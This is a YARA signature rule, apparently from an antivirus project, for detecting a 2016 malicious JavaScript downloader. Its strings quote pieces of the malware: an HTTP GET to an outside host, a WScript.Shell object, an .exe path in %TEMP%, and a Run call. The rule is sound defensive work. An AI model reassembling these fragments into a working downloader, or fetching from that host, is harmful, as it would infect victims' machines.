rule sig_20160330_3927d01a6ec37108ce7c0d45c12753fe {
  meta:
    description = "datamaliciousorder - file 20160330_3927d01a6ec37108ce7c0d45c12753fe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cd94257c6a37171b85db807fd9ad5f147377401743c7030d3d71f3e0cb978f0e"

  strings:
    $s1  = "XH[AX](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var EB = function UU() {return WScript[VU](\"WScript\"+\".Shell\");}(), Q = 11;" fullword ascii
    $s3  = "function IP(Y, G){MX = MX * 1; return Y - G;};" fullword ascii
    $s4  = "if (XH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AQ() {return EB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5TVRRFRKpHg74bX.ex\" + \"e\";};" fullword ascii
    $s6  = "function R(){return QK + \"\";};" fullword ascii
    $s7  = "function LJ(X){EB[\"Run\"](X, MX, MX);};" fullword ascii
    $s8  = "function L() {return ((JZ == true) && (JZ == U)) ? 1 : MX;};" fullword ascii
    $s9  = "function H(){return 22;};" fullword ascii
    $s10 = "}while (Z);" fullword ascii
    $s11 = "var PD = new this[\"Date\"]();" fullword ascii
    $s12 = "return IP(I, M);" fullword ascii
    $s13 = "function C(EO) {var J = (1, 2, 3, 4, 5, EO); return J;};" fullword ascii
    $s14 = "function T(){return VU;};" fullword ascii
    $s15 = "function CQ()" fullword ascii
    $s16 = "U = true; " fullword ascii
    $s17 = "var U = false;" fullword ascii
    $s18 = "JZ = true; " fullword ascii
    $s19 = "var JZ = false;" fullword ascii
    $s20 = "var ZV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}